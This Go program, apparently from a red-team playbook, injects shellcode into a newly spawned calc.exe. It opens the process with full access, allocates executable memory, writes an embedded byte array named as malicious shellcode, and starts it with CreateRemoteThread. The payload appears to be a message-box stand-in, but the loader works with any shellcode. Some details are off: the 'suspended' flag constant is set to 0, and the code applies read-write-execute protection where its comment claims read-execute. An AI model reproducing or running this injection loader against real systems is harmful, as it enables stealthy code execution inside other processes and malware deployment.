package main

import (
	"log"
	"runtime"
	"syscall"
	"unsafe"
)

// Direct syscalls to kernel32.dll
var (
	kernel32DLL                   = syscall.NewLazyDLL("kernel32.dll")
	kernel32DLLOpenProcess        = kernel32DLL.NewProc("OpenProcess")
	kernel32DLLVirtualAllocEx     = kernel32DLL.NewProc("VirtualAllocEx")
	kernel32DLLWriteProcessMemory = kernel32DLL.NewProc("WriteProcessMemory")
	kernel32DLLVirtualProtectEx   = kernel32DLL.NewProc("VirtualProtectEx")
	kernel32DLLCreateRemoteThread = kernel32DLL.NewProc("CreateRemoteThread")
)

// Constants
const (
	// CreateProcess()
	SYSCALL_CREATE_SUSPENDED = 0x00000000 // The primary thread of the new process is created in a suspended state, and does not run until the ResumeThread function is called.
	PROCESS_ALL_ACCESS       = 0x001F0FFF // All possible access rights for a process object.
	MEM_RESERVE              = 0x00002000 // Reserves a range of the process's virtual address space without allocating any actual physical storage in memory or in the paging file on disk.
	MEM_COMMIT               = 0x00001000 // Allocates memory charges (from the overall size of memory and the paging files on disk) for the specified reserved memory pages.
)

func main() {

	// Check if the program is running in Windows
	if runtime.GOOS != "windows" {
		log.Panicf("This program is intended to run on Windows, not %s", runtime.GOOS)
		return
	}

	maliciousShellcodeBytes := []byte{
		0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x00, 0x00, 0x00, 0x41, 0x51,
		0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x3e, 0x48,
		0x8b, 0x52, 0x18, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x48, 0x8b, 0x72, 0x50, 0x3e, 0x48,
		0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02,
		0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x3e,
		0x48, 0x8b, 0x52, 0x20, 0x3e, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x3e, 0x8b, 0x80, 0x88,
		0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x6f, 0x48, 0x01, 0xd0, 0x50, 0x3e, 0x8b, 0x48,
		0x18, 0x3e, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x5c, 0x48, 0xff, 0xc9, 0x3e,
		0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41,
		0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x3e, 0x4c, 0x03, 0x4c, 0x24,
		0x08, 0x45, 0x39, 0xd1, 0x75, 0xd6, 0x58, 0x3e, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
		0x66, 0x3e, 0x41, 0x8b, 0x0c, 0x48, 0x3e, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x3e,
		0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41,
		0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
		0x59, 0x5a, 0x3e, 0x48, 0x8b, 0x12, 0xe9, 0x49, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xc7, 0xc1,
		0x00, 0x00, 0x00, 0x00, 0x3e, 0x48, 0x8d, 0x95, 0xfe, 0x00, 0x00, 0x00, 0x3e, 0x4c, 0x8d,
		0x85, 0x0f, 0x01, 0x00, 0x00, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x45, 0x83, 0x56, 0x07, 0xff,
		0xd5, 0x48, 0x31, 0xc9, 0x41, 0xba, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x73, 0x74, 0x61,
		0x67, 0x65, 0x30, 0x20, 0x73, 0x68, 0x65, 0x6c, 0x6c, 0x63, 0x6f, 0x64, 0x65, 0x00, 0x63,
		0x68, 0x6f, 0x69, 0x20, 0x72, 0x65, 0x64, 0x74, 0x65, 0x61, 0x6d, 0x20, 0x70, 0x6c, 0x61,
		0x79, 0x62, 0x6f, 0x6f, 0x6b, 0x00}

	targetProcessLocation := "C:\\Windows\\System32\\calc.exe"
	targetProcessLocationUTF16PtrFromString, err := syscall.UTF16PtrFromString(targetProcessLocation)
	if err != nil {
		log.Panicf("Error converting the target process location to a UTF-16 pointer: %s", err)
		return
	}

	var processInformation syscall.ProcessInformation
	var startupInformation syscall.StartupInfo
	startupInformation.Cb = uint32(unsafe.Sizeof(startupInformation))
	processInformation.Process = syscall.Handle(0)
	processInformation.Thread = syscall.Handle(0)
	processInformation.ProcessId = 0
	processInformation.ThreadId = 0

	if err := syscall.CreateProcess(
		nil,                                     // lpApplicationName
		targetProcessLocationUTF16PtrFromString, // lpCommandLine
		nil,                                     // lpProcessAttributes
		nil,                                     // lpThreadAttributes
		false,                                   // bInheritHandles
		SYSCALL_CREATE_SUSPENDED,                // dwCreationFlags
		nil,                                     // lpEnvironment
		nil,                                     // lpCurrentDirectory
		&startupInformation,                     // lpStartupInfo
		&processInformation,                     // lpProcessInformation
	); err != nil {
		log.Panicf("[-] Error creating the process: %s", err)
		return
	} else {
		log.Printf("[+] Target process(%s) created as PID %v\n", targetProcessLocation, processInformation.ProcessId)
	}

	// Open the target process
	targetProcessId := processInformation.ProcessId
	targetProcessHandle, _, err := kernel32DLLOpenProcess.Call(
		PROCESS_ALL_ACCESS,       // dwDesiredAccess
		uintptr(0),               // bInheritHandle
		uintptr(targetProcessId)) // dwProcessId
	if err != syscall.Errno(0) {
		log.Panicf("[-] Error opening the process: %s", err)
		return
	} else {
		log.Printf("[+] Target process(%s) handle acquired as process handle %v\n", targetProcessLocation, targetProcessHandle)
	}

	// Allocate memory in the target process
	targetProcessAllocatedMemoryPtr, _, err := kernel32DLLVirtualAllocEx.Call(
		targetProcessHandle,                     // hProcess
		uintptr(0),                              // lpAddress
		uintptr(len(maliciousShellcodeBytes)),   // dwSize
		uintptr(MEM_RESERVE|MEM_COMMIT),         // flAllocationType
		uintptr(syscall.PAGE_EXECUTE_READWRITE)) // flProtect
	if err != syscall.Errno(0) {
		log.Panicf("[-] Error allocating memory in the process: %s", err)
		return
	} else {
		log.Printf("[+] Allocated memory in the target process at 0x%X\n", targetProcessAllocatedMemoryPtr)
	}

	// Write the shellcode to the allocated memory in the target process
	writeProcessMemoryResult, _, err := kernel32DLLWriteProcessMemory.Call(
		targetProcessHandle,                                  // hProcess
		targetProcessAllocatedMemoryPtr,                      // lpBaseAddress
		uintptr(unsafe.Pointer(&maliciousShellcodeBytes[0])), // lpBuffer
		uintptr(len(maliciousShellcodeBytes)),                // nSize
		uintptr(0))                                           // lpNumberOfBytesWritten (ignore)
	if err != syscall.Errno(0) {
		log.Panicf("[-] Error writing the shellcode to the process: %s", err)
		return
	} else {
		log.Printf("[+] Wrote the shellcode to the allocated memory in the target process, %v\n", writeProcessMemoryResult)
	}

	// Modify the protection permission of the allocated memory in the target process, to RX(Read and Execute)
	virtualProtectExResult, _, err := kernel32DLLVirtualProtectEx.Call(
		targetProcessHandle,                     // hProcess
		targetProcessAllocatedMemoryPtr,         // lpAddress
		uintptr(len(maliciousShellcodeBytes)),   // dwSize
		uintptr(syscall.PAGE_EXECUTE_READWRITE), // flNewProtect
		uintptr(0))                              // lpflOldProtect (ignore)
	if err != syscall.Errno(0) {
		log.Panicf("[-] Error modifying the protection permission of the allocated memory in the process: %s", err)
		return
	} else {
		log.Printf("[+] Modified the protection permission of the allocated memory in the target process, %v\n", virtualProtectExResult)
	}

	// Create a remote thread in the target process
	createdRemoteThreadHandle, _, err := kernel32DLLCreateRemoteThread.Call(
		targetProcessHandle,             // hProcess
		uintptr(0),                      // lpThreadAttributes
		uintptr(0),                      // dwStackSize
		targetProcessAllocatedMemoryPtr, // lpStartAddress
		uintptr(0),                      // lpParameter
		uintptr(0),                      // dwCreationFlags
		uintptr(0))                      // lpThreadId (ignore)
	if err != syscall.Errno(0) {
		log.Panicf("[-] Error creating a remote thread in the process: %s", err)
		return
	} else {
		log.Printf("[+] Created a remote thread in the target process, %v\n", createdRemoteThreadHandle)
	}

}
